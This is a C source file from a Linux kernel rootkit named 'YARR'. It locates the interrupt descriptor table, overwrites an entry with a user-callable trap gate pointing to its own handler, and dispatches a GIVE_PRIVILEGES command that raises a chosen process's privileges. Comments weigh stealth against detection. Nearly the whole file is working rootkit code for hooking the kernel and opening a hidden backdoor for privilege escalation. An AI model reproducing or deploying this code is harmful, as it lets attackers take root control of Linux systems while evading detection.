/*
 *  YARR - Yet Another Repetitive Rootkit
 *  Copyright (C) 2011 Ole 
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 1, or (at your option)
 *  any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the 
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
 */

#include <linux/sched.h>
#include <linux/cred.h>
#include <linux/uaccess.h>

#include "interrupt.h"
#include "debug.h"
#include "stats.h"
#include "yarrops.h"

#define RING3 (3)

static gate_desc old_entry;
static IntrStats intr_stats;

struct desc_struct *getIDTEntry(int n) {
    struct desc_ptr idtr;

    native_store_idt(&idtr);

    // Check that we have been asked for a real entry.
    if ((n < 0) || (n >= (idtr.size+1)/8))
        return NULL;
    return ((struct desc_struct *)(idtr.address)) + n;
}

struct desc_struct *getGDTEntry(int n) {
    struct desc_ptr gdtr;

    native_store_gdt(&gdtr);

    // Check that we have been asked for a real entry.
    if ((n < 0) || (n >= (gdtr.size+1)))
        return NULL;
    return ((struct desc_struct *)(gdtr.address)) + n;
}

unsigned long *getIntrDesc(int n) {
    struct desc_ptr idtr, gdtr;
    struct desc_struct *idt_entry, *gdt_entry;
    u32 gate_offset, gate_base;
    unsigned long *gate_desc;

    // Get both IDT and GDT.
    native_store_idt(&idtr);
    native_store_gdt(&gdtr);

    // Get the nth IDT entry.
    idt_entry = getIDTEntry(n);
    if (idt_entry == NULL)
        return NULL;

    // Get the corresponding GDT entry for that IDT entry.
    gdt_entry = getGDTEntry(gate_segment(*idt_entry));
    if (gdt_entry == NULL)
        return NULL;

    // Recover the address of the interrupt descriptor.
    gate_offset = (u32)gate_offset(*idt_entry);
    gate_base = (u32)get_desc_base(gdt_entry);
    gate_desc = (unsigned long *)(gate_base + gate_offset);
    return gate_desc;
}

void cpyIDTEntry(gate_desc *dest, gate_desc *orig) {
	memcpy(dest, orig, sizeof(gate_desc));
}

int saveKernelHandler(unsigned int n, gate_desc *buf) {
	// Check that we are in range.
	if (n < 0 || n >= NR_VECTORS)
		return -1;

	// Copy the entry into our buffer.
	cpyIDTEntry(buf, getIDTEntry(n));
	return 0;
}

void setGate(unsigned int n, unsigned long addr) {
	gate_desc entry, *idt;
	struct desc_ptr idtr;

	// Code extracted from arch/x86/include/asm/desc.h, I prefer to have the
	// same notation.
	entry.a = (__KERNEL_CS << 16) | (addr & 0xffff);
	entry.b = (addr & 0xffff0000) |
			  ((0x80 | (RING3 << 5) | GATE_TRAP) << 8) |
			  0x00;

	native_store_idt(&idtr);
	idt = (gate_desc *)idtr.address;
	native_write_idt_entry(idt, n, &entry);
}

// TODO: We should study how the kernel reserves IRQ and how modules must
// request them (request_irq(), free_irq()) and maybe use that way (stability
// issues) but it could be easy to detect yarr (stealth issues). I still think
// that the "IRQ concept" used by request_irq() and all its family, and the
// "IRQ concept" we are trying to handle here are different. The entry point
// for the first concept is do_IRQ(), but the entry point of the second concept
// (the one we are interested in) are those handlers in IDT/GDT. We want to
// handle what is executed when a userland program executes instruction
// "int $<n>".
int installIntrDesc(unsigned int n) {
	int res = -1;

	// Save the entry that we will override and then override that entry to
	// make it point to our interrupt handler.
	if (saveKernelHandler(n, &old_entry) == 0) {
		setGate(n, (unsigned long)yarrIntrDesc);
		res = intr_stats.calls_count = 0;
	}

	return res;
}

void uninstallIntrDesc(unsigned int n) {
	// Restore the overriden entry.
	cpyIDTEntry(getIDTEntry(n), &old_entry);
}

// TODO: This is how not to do things. This functions is kind of ioctl(), what
// is the mother of all examples of what not to do... Think about a new model,
// design it, implement it, let me know :).
asmlinkage void do_yarrIntrDesc(yarrOps code, const syscallData __user *data) {
	intr_stats.calls_count++;

	// TODO: Add services as they are implemented.
	switch (code) {
		case GIVE_PRIVILEGES:
			givePrivileges(data->pid);
			break;

		default:
			debug("Are you talking to me?! what is %d?.\n", code);
	}

	debug("YARR! WE ARE MIGHTY INTERRUPTERS!\n");
}

